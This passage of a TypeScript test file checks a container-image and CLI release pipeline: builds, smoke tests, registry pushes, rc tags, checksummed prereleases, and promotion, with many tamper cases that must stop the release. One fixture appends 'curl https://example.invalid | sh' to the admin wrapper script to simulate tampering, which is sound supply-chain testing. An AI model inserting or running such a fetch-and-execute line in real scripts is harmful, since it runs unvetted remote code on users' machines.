    assert.ok(smoke.every((args) => args.includes('idea-control-plane-build:5-2')));
    assert.ok(smoke[0]?.includes('python3.13'));
    assert.ok(smoke[0]?.includes('none'));
    assert.match(smoke[0]?.at(-1) ?? '', /import asyncssh, ideaclustermanager/);
    assert.ok(smoke[1]?.includes('/opt/pbs/sbin/pbs_server.bin --version'));
    assert.match(smoke[2]?.at(-1) ?? '', /dnf -q check-update --releasever=latest 'openssh\*'/);
    assert.deepEqual(smoke[3]?.slice(-2), ['ideactl', 'about']);
    assert.ok(smoke[4]?.includes('generate'));
    assert.equal(imagetoolsWrites(commands).length, 0, 'the build job writes no tag');
    assert.ok(!commands.some((args) => args[0] === 'skopeo' || args[0] === 'aws'), 'the build job pushes nothing');
    assert.equal(outputs.digest, DIGEST);
    const archive = readFileSync(join(h.directory, '.runner-temp/control-plane-image/control-plane.tar'));
    assert.equal(outputs.archive_sha256, createHash('sha256').update(archive).digest('hex'));
  });
});

test('the loaded image is matched to the archive by layer diff IDs under either image store', () => {
  // classic store: layers and the config digest; containerd store: layers, its image ID being a manifest digest
  for (const mode of ['absent', 'containerd-store']) {
    harness(mode, (h) => {
      const { result, outputs } = build(h);
      assert.equal(result.status, 0, `${mode}: ${result.output}`);
      assert.equal(outputs.digest, DIGEST, mode);
      assert.ok(h.commands.some((args) => args[0] === 'docker' && args.includes('{{json .RootFS.Layers}}')), mode);
      const removed = h.commands.findIndex((args) => args[0] === 'docker' && args[1] === 'buildx' && args[2] === 'rm');
      const firstSmoke = h.commands.findIndex((args) => args[0] === 'docker' && args[1] === 'run');
      assert.ok(removed > 0 && removed < firstSmoke, 'the builder is removed before the smoke tests and the scan');
    });
  }
});

test('build, smoke, fixture, archive or release-check failures stop before the archive is recorded', () => {
  for (const mode of ['existing', 'network', 'missing-fixture', 'missing-image-check', 'image-check-failure', 'version-file-missing', 'version-mismatch', 'build-failure', 'smoke-failure', 'import-failure', 'control-failure', 'config-failure', 'loaded-mismatch', 'config-mismatch', 'two-manifests']) {
    harness(mode, (h) => {
      const { result, outputs } = build(h);
      assert.notEqual(result.status, 0, mode);
      assert.equal(outputs.digest, undefined, mode);
    }, { missingFixture: mode === 'missing-fixture', missingImageCheck: mode === 'missing-image-check' });
  }
});

/** The publish job's steps, given what the build job recorded. */
function publish(h: Harness, outputs: Record<string, string>, env: Record<string, string> = {}): Run {
  const recorded = { ARCHIVE_SHA256: outputs.archive_sha256 ?? '', DIGEST: outputs.digest ?? '' };
  return h.steps([{ script: archiveCheck, env: { ...recorded, ...env } }, { script: pushScript, env: { ...recorded, ...env } }]);
}

test('the archive is pushed unchanged, read back as the recorded digest, and a candidate takes only its rc tag', () => {
  harness('absent', (h) => {
    const { outputs } = build(h);
    writeFileSync(h.output, '');
    const result = publish(h, outputs, { RELEASE_CANDIDATE: '4' });
    assert.equal(result.status, 0, result.output);
    const commands = h.commands;
    const pushes = commands.filter((args) => args[0] === 'skopeo' && args[3]?.startsWith('oci-archive:'));
    assert.equal(pushes.length, 1);
    assert.deepEqual(pushes[0], ['skopeo', 'copy', '--preserve-digests',
      `oci-archive:${join(h.directory, '.runner-temp/control-plane-image/control-plane.tar')}`, `docker://${REPOSITORY}:build-test-commit-5-2`]);
    const writes = imagetoolsWrites(commands);
    assert.equal(writes.length, 1);
    assert.deepEqual(writes[0], ['skopeo', 'copy', '--preserve-digests', `docker://${CANDIDATE_IMAGE}`, `docker://${REPOSITORY}:1.2.3-rc.4`]);
    // the tag is read back as the recorded digest, after the write
    const readBack = commands.slice(commands.indexOf(writes[0]!) + 1)
      .filter((args) => args[2] === 'imagetools' && args[3] === 'inspect' && args[4] === `${REPOSITORY}:1.2.3-rc.4`);
    assert.equal(readBack.length, 1);
    // The candidate is checked absent again just before its tag is written.
    const lastCandidateCheck = commands.map((args, index) => [args, index] as const)
      .filter(([args]) => args[0] === 'gh' && args[2]?.endsWith('/releases/tags/v1.2.3-rc.4')).at(-1);
    assert.ok(lastCandidateCheck && lastCandidateCheck[1] > commands.indexOf(pushes[0]!));
    assert.match(readFileSync(h.output, 'utf8'), new RegExp(`^image=${CANDIDATE_IMAGE}$`, 'm'));
  });
});

test('a private dispatch writes no tag, and no dispatch ever writes a released tag', () => {
  for (const candidate of ['', '7']) {
    harness('absent', (h) => {
      const { outputs } = build(h);
      const result = publish(h, outputs, { RELEASE_CANDIDATE: candidate });
      assert.equal(result.status, 0, result.output);
      const tags = imagetoolsWrites(h.commands).flat();
      for (const released of RELEASED_TAGS) assert.ok(!tags.includes(released), `${candidate || 'private'}: ${released}`);
      if (!candidate) {
        assert.equal(imagetoolsWrites(h.commands).length, 0);
        assert.match(result.output, /Private build .*no release tags are written by a dispatch/);
      }
    });
  }
});

test('an altered or unrecorded archive, a failed push or a candidate check stops before any tag', () => {
  const cases: [string, string, (outputs: Record<string, string>) => Record<string, string>, Record<string, string>][] = [
    ['archive bytes differ from the record', 'absent', (o) => ({ ...o, archive_sha256: 'f'.repeat(64) }), {}],
    ['manifest differs from the record', 'absent', (o) => ({ ...o, digest: `sha256:${'e'.repeat(64)}` }), {}],
    ['no recorded digests', 'absent', () => ({}), {}],
    ['push fails', 'push-failure', (o) => o, {}],
    ['registry serves another digest', 'digest-mismatch', (o) => o, {}],
    ['release exists', 'existing', (o) => o, {}],
    ['candidate exists', 'absent', (o) => o, { RC_MODE: 'existing' }],
    ['candidate lookup fails', 'absent', (o) => o, { RC_MODE: 'network' }],
    ['candidate tag exists without a release', 'absent', (o) => o, { TAG_MODE: 'existing' }],
    ['release tag exists without a release', 'absent', (o) => o, { TAG_MODE: 'existing', RELEASE_CANDIDATE: '' }],
    ['rc tag left at another image', 'rc-tag-other', (o) => o, {}],
    ['rc tag read fails for another reason than not found', 'rc-read-error', (o) => o, {}],
    ['rc tag left reading as another digest', 'rc-digest-mismatch', (o) => o, {}],
    ['rc tag reads back another digest after the write', 'registry-rewrites', (o) => o, {}],
  ];
  for (const [label, mode, change, env] of cases) {
    harness(mode === 'existing' ? 'absent' : mode, (h) => {
      const { outputs } = build(h);
      const result = publish(h, change(outputs), { RELEASE_CANDIDATE: '4', ...env, ...(mode === 'existing' ? { RELEASE_TEST_MODE: 'existing' } : {}) });
      assert.notEqual(result.status, 0, label);
      assert.equal(imagetoolsWrites(h.commands).length, mode === 'registry-rewrites' ? 1 : 0, label);
      if (mode === 'registry-rewrites') assert.match(result.output, /never read back as/);
    });
  }
});

test('the build writes the cache only when asked, and refuses anything but true or false', () => {
  const cacheWrites = (commands: string[][]) =>
    commands.filter((args) => args[0] === 'docker' && args[2] === 'build').flat().filter((arg) => arg.startsWith('type=gha') && arg.includes('mode=max'));
  harness('absent', (h) => {
    const { result } = build(h, { CACHE_WRITE: 'false' });
    assert.equal(result.status, 0, result.output);
    assert.deepEqual(cacheWrites(h.commands), []);
    assert.ok(h.commands.some((args) => args.includes('type=gha,version=2,scope=idea-control-plane')), 'the cache is still read');
  });
  for (const value of ['', 'yes', 'True']) {
    harness('absent', (h) => {
      const { result } = build(h, { CACHE_WRITE: value });
      assert.notEqual(result.status, 0, value);
      assert.ok(!h.commands.some((args) => args[0] === 'docker' && args[2] === 'build'), value);
    });
  }
});

/** Release files with genuine checksums, as the build jobs upload them. */
function releaseFiles(): Record<string, string> {
  const files: Record<string, string> = {};
  const sums: string[] = [];
  for (const name of TARGETS) {
    const body = name.split('-').slice(2).join('-');
    const hash = createHash('sha256').update(body).digest('hex');
    files[name] = body;
    files[`${name}.sha256`] = `${hash}  ${name}\n`;
    sums.push(`${hash}  ${name}`);
  }
  files['SHA256SUMS'] = sums.sort().join('\n') + '\n';
  return files;
}

test('a candidate is published as a prerelease with its tree, commit and image digest, once', () => {
  const run = (h: Harness, env: Record<string, string>) => {
    mkdirSync(join(h.directory, 'release'));
    for (const [name, body] of Object.entries(releaseFiles())) if (name !== 'SHA256SUMS') writeFileSync(join(h.directory, 'release', name), body);
    const candidateEnv = { RELEASE_CANDIDATE: '4', IMAGE: `${REPOSITORY}@sha256:control`, ...env };
    return h.steps([
      { script: candidateChecksums, cwd: 'release' },
      { script: candidateRecord, env: candidateEnv },
      { script: candidatePublication, env: candidateEnv },
    ]);
  };
  harness('absent', (h) => {
    const result = run(h, {});
    assert.equal(result.status, 0, result.output);
    const writes = releaseWrites(h.commands);
    assert.equal(writes.length, 1);
    const create = writes[0]!;
    assert.equal(create[3], 'v1.2.3-rc.4');
    assert.ok(create.includes('--prerelease'));
    assert.equal(create[create.indexOf('--target') + 1], 'test-commit');
    for (const file of ['release/ideactl-v1.2.3-windows-amd64.zip', 'release/ideactl-v1.2.3-windows-amd64.zip.sha256', 'release/SHA256SUMS', 'release/candidate.json']) {
      assert.ok(create.includes(file), file);
    }
    assert.equal(h.run('cd release && sha256sum --check SHA256SUMS').status, 0);
    assert.match(readFileSync(join(h.directory, 'release/SHA256SUMS'), 'utf8'), /[a-f0-9]{64}  candidate\.json/);
    assert.deepEqual(JSON.parse(readFileSync(join(h.directory, 'release/candidate.json'), 'utf8')), {
      version: '1.2.3', candidate: 4, tree: TREE, commit: 'test-commit', image: `${REPOSITORY}@sha256:control`, run_id: 5, run_attempt: 2,
    });
    // the released wrapper is the tree's with this image's digest filled in, and is checksummed
    assert.equal(readFileSync(join(h.directory, 'release/idea-admin.sh'), 'utf8'), stamped('sha256:control'));
    assert.match(readFileSync(join(h.directory, 'release/SHA256SUMS'), 'utf8'), /[a-f0-9]{64}  idea-admin\.sh/);
    assert.ok(create.includes('release/idea-admin.sh'));
    // the run keeps its own copy, which promotion checks against, and the published files are read back
    for (const file of ['candidate.json', 'SHA256SUMS', 'idea-admin.sh']) {
      assert.equal(readFileSync(join(h.directory, 'release-record', file), 'utf8'), readFileSync(join(h.directory, 'release', file), 'utf8'), file);
      assert.ok(h.commands.some((args) => args[1] === 'release' && args[2] === 'download' && args.includes(file)), file);
    }
    assert.match(create[create.indexOf('--notes') + 1] ?? '', /idea-control-plane:1\.2\.3-rc\.4 \(sha256:control\)/);
  });
  for (const [label, mode, env] of [
    ['candidate exists', 'absent', { RC_MODE: 'existing' }],
    ['candidate lookup fails', 'absent', { RC_MODE: 'network' }],
    ['release exists', 'existing', {}],
    ['image without a digest', 'absent', { IMAGE: `${REPOSITORY}:1.2.3-rc.4` }],
    ['no image', 'absent', { IMAGE: '' }],
  ] as const) {
    harness(mode, (h) => {
      const result = run(h, env);
      assert.notEqual(result.status, 0, label);
      assert.equal(releaseWrites(h.commands).length, 0, label);
    });
  }
  harness('readback-differs', (h) => {
    const result = run(h, {});
    assert.notEqual(result.status, 0, 'a published file that is not the recorded one fails the run');
  });
  harness('absent', (h) => {
    writeFileSync(join(h.directory, 'idea-admin.sh'), ADMIN.replace('IDEA_IMAGE_DIGEST_DEFAULT=""\n', ''));
    assert.notEqual(run(h, {}).status, 0, 'a wrapper without the digest line is not released');
    assert.equal(releaseWrites(h.commands).length, 0);
  });
  harness('absent', (h) => {
    const files = releaseFiles();
    files['ideactl-v1.2.3-linux-amd64.tar.gz'] = 'tampered';
    mkdirSync(join(h.directory, 'release'));
    for (const [name, body] of Object.entries(files)) if (name !== 'SHA256SUMS') writeFileSync(join(h.directory, 'release', name), body);
    const candidateEnv = { RELEASE_CANDIDATE: '4', IMAGE: `${REPOSITORY}@sha256:control` };
    const result = h.steps([
      { script: candidateChecksums, cwd: 'release' },
      { script: candidateRecord, env: candidateEnv },
      { script: candidatePublication, env: candidateEnv },
    ]);
    assert.notEqual(result.status, 0, 'a file that does not match its checksum');
    assert.equal(releaseWrites(h.commands).length, 0);
  });
});

/** Prerelease fixtures: the version, its tree and its digest per tag. */
function candidate(tag: string, version: string, tree: string, assets = releaseFiles()): Release {
  const number = Number(tag.split('-rc.')[1]);
  const manifest: Record<string, unknown> = { version, candidate: number, tree, commit: `commit-${tag}`, image: CANDIDATE_IMAGE, run_id: 7, run_attempt: 1 };
  assets['idea-admin.sh'] = stamped(DIGEST);
  return resum({ tag, prerelease: true, assets, candidate: manifest });
}

/** Recomputes a candidate's SHA256SUMS from its files, its manifest and its wrapper. */
function resum(release: Release, base = releaseFiles()['SHA256SUMS']!): Release {
  const sum = (body: string) => createHash('sha256').update(body).digest('hex');
  release.assets!['SHA256SUMS'] = base + `${sum(JSON.stringify(release.candidate))}  candidate.json\n${sum(release.assets!['idea-admin.sh']!)}  idea-admin.sh\n`;
  return release;
}

test('an absent rc tag is written; a failed read of it stops the candidate before any write', () => {
  harness('rc-absent', (h) => {
    const { outputs } = build(h);
    const result = publish(h, outputs, { RELEASE_CANDIDATE: '4' });
    assert.equal(result.status, 0, result.output);
    assert.equal(imagetoolsWrites(h.commands).length, 1);
  });
  harness('rc-read-error', (h) => {
    const { outputs } = build(h);
    const result = publish(h, outputs, { RELEASE_CANDIDATE: '4' });
    assert.notEqual(result.status, 0);
    assert.match(result.output, /Could not read .*1\.2\.3-rc\.4 to check that it is absent/);
    assert.equal(imagetoolsWrites(h.commands).length, 0);
  });
});

test('promotion stops, rather than falling back to a lower candidate, when a read of a higher one fails', () => {
  const releases = [candidate('v1.2.3-rc.2', '1.2.3', TREE), candidate('v1.2.3-rc.3', '1.2.3', TREE)];
  for (const mode of ['view-failure', 'download-failure']) {
    harness(mode, (h) => {
      const result = h.run('bash source/idea/ideactl/scripts/find-release-candidate.sh');
      assert.notEqual(result.status, 0, mode);
      assert.equal(result.stdout, '', `${mode}: no candidate is named`);
      assert.match(result.output, /Promotion stopped/, mode);
    }, { releases });
  }
});

test('promotion finds the highest candidate built from exactly this tree and version', () => {
  const releases: Release[] = [
    { tag: 'v1.2.2', prerelease: false },
    candidate('v1.2.3-rc.2', '1.2.3', TREE),
    candidate('v1.2.3-rc.10', '1.2.3', TREE),
    candidate('v1.2.3-rc.11', '1.2.3', 'other-tree'),
    { tag: 'v1.2.3-rc.12', prerelease: true },
    candidate('v1.2.3-rc.13', '9.9.9', TREE),
    candidate('v1.2.30-rc.99', '1.2.30', TREE),
    candidate('v1x2y3-rc.98', '1.2.3', TREE),
    { ...candidate('v1.2.3-rc.97', '1.2.3', TREE), prerelease: false },
  ];
  harness('absent', (h) => {
    const result = h.run('bash source/idea/ideactl/scripts/find-release-candidate.sh');
    assert.equal(result.status, 0, result.output);
    assert.equal(result.stdout, 'v1.2.3-rc.10\n', 'stdout carries only the tag');
    assert.match(result.output, /v1\.2\.3-rc\.13 was built from tree/);
    assert.match(result.output, /v1\.2\.3-rc\.11 was built from tree other-tree/);
    assert.match(result.output, /v1\.2\.3-rc\.12 has no candidate\.json; skipped/);
    const downloads = h.commands.filter((args) => args[1] === 'release' && args[2] === 'download').map((args) => args[3]);
    assert.ok(!downloads.includes('v1.2.30-rc.99') && !downloads.includes('v1x2y3-rc.98') && !downloads.includes('v1.2.3-rc.97'));
  }, { releases });
  for (const set of [
    [],
    [candidate('v1.2.3-rc.1', '1.2.3', 'other-tree'), { tag: 'v1.2.3-rc.2', prerelease: true }, candidate('v1.2.30-rc.1', '1.2.30', TREE)],
  ]) {
    harness('absent', (h) => {
      const result = h.run('bash source/idea/ideactl/scripts/find-release-candidate.sh');
      assert.notEqual(result.status, 0);
      assert.equal(result.stdout, '');
      assert.match(result.output, /No release candidate for v1\.2\.3 was built from tree tree-under-release/);
    }, { releases: set });
  }
});

test('promotion warns and skips malformed or incomplete candidate manifests', () => {
  for (const manifest of ['{bad json', '{}', '{"version":"1.2.3"}', '{"tree":"tree-under-release"}',
    '{"version":"1.2.3","tree":null}', '{"version":"1.2.3","tree":""}', '{"version":123,"tree":"tree-under-release"}']) {
    const malformed = { tag: 'v1.2.3-rc.2', prerelease: true, assets: { 'candidate.json': manifest } };
    for (const valid of [true, false]) {
      harness('absent', (h) => {
        const result = h.run('bash source/idea/ideactl/scripts/find-release-candidate.sh');
        assert.equal(result.status, valid ? 0 : 1, result.output);
        assert.match(result.output, /::warning::v1\.2\.3-rc\.2 has invalid or incomplete candidate\.json; skipped\./);
        assert.equal(result.stdout, valid ? 'v1.2.3-rc.1\n' : '');
        if (!valid) assert.match(result.output, /::error::No release candidate/);
      }, { releases: [malformed, ...(valid ? [candidate('v1.2.3-rc.1', '1.2.3', TREE)] : [])] });
    }
  }
});

/** The promote job's steps in order, with the candidate tag passed on as the workflow does. */
function promote(h: Harness): Run {
  const found = h.run(promoteFind);
  if (found.status !== 0) return found;
  const tag = /^tag=(.*)$/m.exec(readFileSync(h.output, 'utf8'))?.[1] ?? '';
  return h.steps([
    { script: promoteDownload, env: { TAG: tag } },
    { script: promoteTag, env: { CANDIDATE_TAG: tag } },
    { script: promotePublish, env: { TAG: tag } },
  ]);
}

test('promotion re-tags the candidate digest and republishes its files unchanged', () => {
  harness('absent', (h) => {
    const result = promote(h);
    assert.equal(result.status, 0, result.output);
    const commands = h.commands;
    const writes = imagetoolsWrites(commands);
    assert.deepEqual(writes, RELEASED_TAGS.map((tag) => ['skopeo', 'copy', '--preserve-digests', `docker://${CANDIDATE_IMAGE}`, `docker://${tag}`]));
    const write = commands.indexOf(writes.at(-1)!);
    const verified = commands.slice(write + 1).filter((args) => args[2] === 'imagetools' && args[3] === 'inspect' && args.includes('--raw'));
    assert.deepEqual(verified.map((args) => args[4]), RELEASED_TAGS, 'each released tag is read back after the write');
    const releasesCreated = releaseWrites(commands);
    assert.equal(releasesCreated.length, 1);
    const create = releasesCreated[0]!;
    assert.equal(create[3], 'v1.2.3');
    assert.ok(!create.includes('--prerelease'));
    assert.equal(create[create.indexOf('--target') + 1], 'test-commit');
    assert.ok(commands.indexOf(create) > commands.indexOf(verified.at(-1)!));
    // exactly the recorded files, with sidecars written again from SHA256SUMS
    const published = create.filter((arg) => arg.startsWith('release-publish/')).map((arg) => arg.slice('release-publish/'.length)).sort();
    assert.deepEqual(published, [...TARGETS.flatMap((name) => [name, `${name}.sha256`]), 'SHA256SUMS', 'candidate.json', 'idea-admin.sh'].sort());
    // the attempt that published is the one checked, and its record is the one read
    assert.ok(commands.some((args) => args[1] === 'api' && args[2]?.endsWith('/actions/runs/7/attempts/1')));
    assert.ok(commands.some((args) => args[1] === 'run' && args.includes('release-record-attempt-1')));
    const notes = create[create.indexOf('--notes') + 1] ?? '';
    assert.ok(notes.includes(`digest ${DIGEST}.`) && /Released unchanged from v1\.2\.3-rc\.3: /.test(notes), notes);
    assert.match(notes, /unsigned.*SmartScreen.*Run anyway/);
    // The released files are the candidate's bytes.
    for (const [name, body] of Object.entries(candidate('v1.2.3-rc.3', '1.2.3', TREE).assets!)) assert.equal(readFileSync(join(h.directory, 'release', name), 'utf8'), body, name);
  }, { releases: [candidate('v1.2.3-rc.3', '1.2.3', TREE)] });
});

test('promotion stops before any tag or release on a missing, altered or unverifiable candidate', () => {
  const tampered = releaseFiles();
  tampered['ideactl-v1.2.3-windows-amd64.zip'] = 'tampered';
  const undigested = candidate('v1.2.3-rc.3', '1.2.3', TREE);
  undigested.candidate!.image = `${REPOSITORY}:1.2.3-rc.3`;
  const unnamed = candidate('v1.2.3-rc.3', '1.2.3', TREE);
  unnamed.candidate!.image = '';
  const wrongRepository = candidate('v1.2.3-rc.3', '1.2.3', TREE);
  wrongRepository.candidate!.image = `foreign.invalid/repository@${DIGEST}`;
  for (const release of [undigested, unnamed, wrongRepository]) resum(release);
  const tamperedManifest = candidate('v1.2.3-rc.3', '1.2.3', TREE);
  tamperedManifest.candidate!.commit = 'altered';
  const missingManifestChecksum = candidate('v1.2.3-rc.3', '1.2.3', TREE);
  missingManifestChecksum.assets!['SHA256SUMS'] = missingManifestChecksum.assets!['SHA256SUMS']!.replace(/^.*  candidate\.json\n/m, '');
  const missingWrapperChecksum = candidate('v1.2.3-rc.3', '1.2.3', TREE);
  missingWrapperChecksum.assets!['SHA256SUMS'] = missingWrapperChecksum.assets!['SHA256SUMS']!.replace(/^.*  idea-admin\.sh\n/m, '');
  // A wrapper re-pointed at another image, or changed beyond the digest, with matching checksums and record.
  const wrapperRepointed = candidate('v1.2.3-rc.3', '1.2.3', TREE);
  wrapperRepointed.assets!['idea-admin.sh'] = stamped(`sha256:${'d'.repeat(64)}`);
  resum(wrapperRepointed);
  const wrapperEdited = candidate('v1.2.3-rc.3', '1.2.3', TREE);
  wrapperEdited.assets!['idea-admin.sh'] = stamped(DIGEST) + 'curl https://example.invalid | sh\n';
  resum(wrapperEdited);
  const attemptless = candidate('v1.2.3-rc.3', '1.2.3', TREE);
  delete attemptless.candidate!.run_attempt;
  resum(attemptless);
  // An archive replaced in the release together with a matching checksum: only the run's record differs.
  const replaced = candidate('v1.2.3-rc.3', '1.2.3', TREE);
  const originalRecord = { 'candidate.json': JSON.stringify(replaced.candidate), SHA256SUMS: replaced.assets!['SHA256SUMS']!, 'idea-admin.sh': replaced.assets!['idea-admin.sh']! };
  const swapped = releaseFiles();
  swapped['ideactl-v1.2.3-linux-amd64.tar.gz'] = 'replaced';
  const swappedHash = createHash('sha256').update('replaced').digest('hex');
  swapped['ideactl-v1.2.3-linux-amd64.tar.gz.sha256'] = `${swappedHash}  ideactl-v1.2.3-linux-amd64.tar.gz\n`;
  swapped['SHA256SUMS'] = swapped['SHA256SUMS']!.replace(/^[0-9a-f]{64}(?=  ideactl-v1\.2\.3-linux-amd64)/m, swappedHash);
  const consistentlyReplaced = { ...resum(candidate('v1.2.3-rc.3', '1.2.3', TREE, swapped), swapped['SHA256SUMS']), record: originalRecord };
  const manifestRepointed = candidate('v1.2.3-rc.3', '1.2.3', TREE);
  manifestRepointed.record = { ...originalRecord, 'candidate.json': JSON.stringify({ ...manifestRepointed.candidate, image: `${REPOSITORY}@sha256:${'d'.repeat(64)}` }) };
  const unrecorded = { ...candidate('v1.2.3-rc.3', '1.2.3', TREE), record: null };
  const runless = candidate('v1.2.3-rc.3', '1.2.3', TREE);
  delete runless.candidate!.run_id;
  resum(runless);
  // A platform archive missing from the candidate: its run recorded three targets.
  const threeTargets = releaseFiles();
  for (const name of ['ideactl-v1.2.3-darwin-arm64.tar.gz', 'ideactl-v1.2.3-darwin-arm64.tar.gz.sha256']) delete threeTargets[name];
  threeTargets['SHA256SUMS'] = threeTargets['SHA256SUMS']!.replace(/^.*darwin-arm64.*\n/m, '');
  const missingTarget = resum(candidate('v1.2.3-rc.3', '1.2.3', TREE, threeTargets), threeTargets['SHA256SUMS']);
  const cases: [string, string, Release[], { tags: number }][] = [
    ['a platform archive is missing', 'absent', [missingTarget], { tags: 0 }],
    ['foreign release author', 'foreign-author', [candidate('v1.2.3-rc.3', '1.2.3', TREE)], { tags: 0 }],
    ['tampered candidate manifest', 'absent', [tamperedManifest], { tags: 0 }],
    ['manifest checksum missing', 'absent', [missingManifestChecksum], { tags: 0 }],
    ['archive and checksum replaced together in the release', 'absent', [consistentlyReplaced], { tags: 0 }],
    ['release manifest differs from the run record', 'absent', [manifestRepointed], { tags: 0 }],
    ['candidate run kept no record', 'absent', [unrecorded], { tags: 0 }],
    ['candidate names no run', 'absent', [runless], { tags: 0 }],
    ['candidate names no run attempt', 'absent', [attemptless], { tags: 0 }],
    ['wrapper checksum missing', 'absent', [missingWrapperChecksum], { tags: 0 }],
    ['wrapper carries another image digest', 'absent', [wrapperRepointed], { tags: 0 }],
    ['wrapper changed beyond the digest', 'absent', [wrapperEdited], { tags: 0 }],
    ['candidate run is another workflow', 'run-other-workflow', [candidate('v1.2.3-rc.3', '1.2.3', TREE)], { tags: 0 }],
    ['candidate run did not succeed', 'run-failed', [candidate('v1.2.3-rc.3', '1.2.3', TREE)], { tags: 0 }],
    ['candidate run built another tree', 'run-other-tree', [candidate('v1.2.3-rc.3', '1.2.3', TREE)], { tags: 0 }],
    ['wrong repository', 'absent', [wrongRepository], { tags: 0 }],
    ['rc tag digest mismatch', 'rc-digest-mismatch', [candidate('v1.2.3-rc.3', '1.2.3', TREE)], { tags: 0 }],
    ['no candidate', 'absent', [], { tags: 0 }],
    ['candidate from another tree', 'absent', [candidate('v1.2.3-rc.3', '1.2.3', 'other-tree')], { tags: 0 }],
    ['file altered after the candidate was proven', 'absent', [candidate('v1.2.3-rc.3', '1.2.3', TREE, tampered)], { tags: 0 }],
    ['candidate image without a digest', 'absent', [undigested], { tags: 0 }],
    ['candidate without an image', 'absent', [unnamed], { tags: 0 }],
    ['candidate image no longer in the registry', 'missing-image', [candidate('v1.2.3-rc.3', '1.2.3', TREE)], { tags: 0 }],
    ['release already exists', 'existing', [candidate('v1.2.3-rc.3', '1.2.3', TREE)], { tags: 0 }],
    ['release lookup fails', 'network', [candidate('v1.2.3-rc.3', '1.2.3', TREE)], { tags: 0 }],
    // The registry answers with another digest after the write: the release is not published.
    ['released tag reads back another digest', 'digest-mismatch', [candidate('v1.2.3-rc.3', '1.2.3', TREE)], { tags: 3 }],
  ];
  for (const [label, mode, releases, expected] of cases) {
    harness(mode, (h) => {
      const result = promote(h);
      assert.notEqual(result.status, 0, label);
      assert.equal(imagetoolsWrites(h.commands).length, expected.tags, label);
      assert.equal(releaseWrites(h.commands).length, 0, label);
    }, { releases });
  }
});

test('promotion publishes only the recorded files: an added asset is left out, a changed sidecar is rewritten', () => {
  const release = candidate('v1.2.3-rc.3', '1.2.3', TREE);
  release.assets!['ideactl-v1.2.3-linux-riscv64.tar.gz'] = 'added after the candidate';
  release.assets!['ideactl-v1.2.3-linux-amd64.tar.gz.sha256'] = `${'0'.repeat(64)}  ideactl-v1.2.3-linux-amd64.tar.gz\n`;
  harness('absent', (h) => {
    const result = promote(h);
    assert.equal(result.status, 0, result.output);
    const create = releaseWrites(h.commands)[0]!;
    assert.ok(!create.some((arg) => arg.includes('riscv64')), 'an asset outside the record is not released');
    const sidecar = readFileSync(join(h.directory, '.releases/v1.2.3/ideactl-v1.2.3-linux-amd64.tar.gz.sha256'), 'utf8');
    assert.equal(sidecar, `${createHash('sha256').update('linux-amd64.tar.gz').digest('hex')}  ideactl-v1.2.3-linux-amd64.tar.gz\n`);
  }, { releases: [release] });
});

test('a candidate goes only to the registry idea-admin.sh and promotion accept', () => {
  const guard = step('build_image', 'Validate the candidate registry');
  harness('absent', (h) => {
    assert.equal(h.run(guard, { RELEASE_CANDIDATE: '4', ECR_REGISTRY: '' }).status, 0);
    assert.equal(h.run(guard, { RELEASE_CANDIDATE: '4', ECR_REGISTRY: 'registry.example.invalid/idea' }).status, 0);
    assert.equal(h.run(guard, { RELEASE_CANDIDATE: '', ECR_REGISTRY: 'public.ecr.aws/private-alias' }).status, 0, 'a private build may go elsewhere');
    const refused = h.run(guard, { RELEASE_CANDIDATE: '4', ECR_REGISTRY: 'public.ecr.aws/private-alias' });
    assert.notEqual(refused.status, 0);
    assert.match(refused.output, /leave ecr_repository at its default/);
  });
});

test('the release is created only when absent and never replaced', () => {
  for (const mode of ['absent', 'existing', 'late-existing', 'network', 'unauthorized']) {
    harness(mode, (h) => {
      for (const folder of ['release', 'release-publish']) {
        mkdirSync(join(h.directory, folder));
        for (const [name, body] of Object.entries(releaseFiles())) writeFileSync(join(h.directory, folder, name), body);
        writeFileSync(join(h.directory, folder, 'candidate.json'), JSON.stringify({ image: CANDIDATE_IMAGE }));
        writeFileSync(join(h.directory, folder, 'idea-admin.sh'), stamped(DIGEST));
      }
      // A release that appears between the tag step and publication is not replaced.
      if (mode === 'late-existing') h.run('bash source/idea/ideactl/scripts/assert-new-release.sh');
      const result = h.run(promotePublish, { TAG: 'v1.2.3-rc.3' });
      assert.equal(result.status, mode === 'absent' ? 0 : 1, `${mode}: ${result.output}`);
      const writes = releaseWrites(h.commands);
      assert.equal(writes.length, mode === 'absent' ? 1 : 0, mode);
      if (writes[0]) {
        assert.deepEqual(writes[0].slice(0, 4), ['gh', 'release', 'create', 'v1.2.3']);
        assert.ok(writes[0].includes('test-commit'));
      }
    });
  }
  assert.ok(existsSync(join(scripts, 'assert-new-release.sh')));
});

test('only complete CDK replay bypasses the live identity banner', async () => {
  for (const replay of [[], ['--config-file', 'settings.json'], ['--synth-reads', 'reads.json'], ['--config-file', 'settings.json', '--synth-reads', 'reads.json']]) {
    let calls = 0;
    const deps = fakeDeps();
    deps.callerIdentity = async () => { calls++; return { account: '1'.repeat(12), arn: 'synthetic-identity', userId: 'test' }; };
    const program = buildProgram(deps);
    program.commands.find((command) => command.name() === 'cdk')?.commands.find((command) => command.name() === 'cdk-app')?.action(() => {});
    await program.parseAsync(['cdk', 'cdk-app', '--cluster-name', 'idea-test1', '--aws-region', 'us-east-2', '--module-id', 'identity-provider', '--module-name', 'identity-provider', ...replay], { from: 'user' });
    assert.equal(calls, replay.length === 4 ? 0 : 1);
  }
});
